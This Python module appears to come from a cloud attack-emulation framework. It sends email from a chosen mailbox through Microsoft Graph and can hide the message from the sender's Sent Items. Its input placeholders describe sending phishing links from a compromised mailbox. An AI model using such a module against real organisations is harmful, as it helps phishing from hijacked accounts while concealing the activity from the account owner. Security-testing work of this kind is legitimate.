'''
Module Name : Send_Outlook_Email
Description : Craft and send email using users mailbox
'''
from core.GraphFunctions import graph_post_request

def TechniqueMain(user_id, subject, message_content, to_recipient, hide_from_mailbox, cc_recipient = None):
    # input validation
    if user_id in [None, ""]:
        return False, {"Error" : "Invalid Technique Input"}, None
    if subject in [None, ""]:
        return False, {"Error" : "Invalid Technique Input"}, None
    if message_content in [None, ""]:
        return False, {"Error" : "Invalid Technique Input"}, None
    if to_recipient in [None, ""]:
        return False, {"Error" : "Invalid Technique Input"}, None

    endpoint_url = f"https://graph.microsoft.com/v1.0/users/{user_id}/sendMail"

    data = {
        "message" : {
            "subject" : subject,
            "body" : {
                "contentType" : "Text",
                "content" : message_content
            },
            "toRecipients": [
                {
                    "emailAddress": {
                        "address": to_recipient
                    }
                }
            ],
        },
        "saveToSentItems": "true"
    }  

    if hide_from_mailbox == True:
        data.update({"saveToSentItems" : "false"})

    # if cc_recipient:
    #     data["ccRecipients"] = [
    #         {
    #             "emailAddress": {
    #             "address": {cc_recipient}
    #             }
    #         }
    #         ]

    try:
        raw_response = graph_post_request(url = endpoint_url, data = data)

        # send email successfull
        if 200 <= raw_response.status_code < 300:
            # parse raw response => pretty response
            try:
                # create pretty response
                pretty_response = {}

                pretty_response["Success"] = {
                    'Message' : "Email sent",
                    'Sender' : user_id,
                    'Subject' : subject,
                    'Recipient' : to_recipient,
                    'Email Hidden' : hide_from_mailbox
                }
                return True, raw_response, pretty_response
            except:
                # return only raw response if pretty response fails
                return True, raw_response, None
        
        # send email failed
        else:
            return False, {"Error" : {"Response Status" : raw_response.status_code, "Code" : raw_response.json().get('error').get('code', 'N/A'), "Message" : raw_response.json().get('error').get('message', 'N/A')}}, None
    
    except Exception as e:
        return False, {"Error" : e}, None

def TechniqueInputSrc() -> list:
    '''Returns the input fields required as parameters for the technique execution'''
    return [
        {"title" : "Sender Mailbox Address", "id" : "sender-email-address-text-input", "type" : "email", "placeholder" : "compromised-mailbox@corp.com", "element_type" : "dcc.Input"},
        {"title" : "Subject", "id" : "subject-text-input", "type" : "text", "placeholder" : "Seriously-Legitimate-Forwarding-Rule", "element_type" : "dcc.Input"},
        {"title" : "Email Content", "id" : "email-content-text-input", "type" : "text", "placeholder" : "Drop that Phishing Link", "element_type" : "dcc.Input"},
        {"title" : "Recipient Mailbox Address", "id" : "recipient-email-address-text-input", "type" : "text", "placeholder" : "another-mailbox@corp.com", "element_type" : "dcc.Input"},
        {"title" : "Hide Email from Sender's Mailbox", "id" : "save-to-sent-items-boolean-switch", "type" : "email", "placeholder" : "attacker@attacker.com", "element_type" : "daq.BooleanSwitch"}
    ]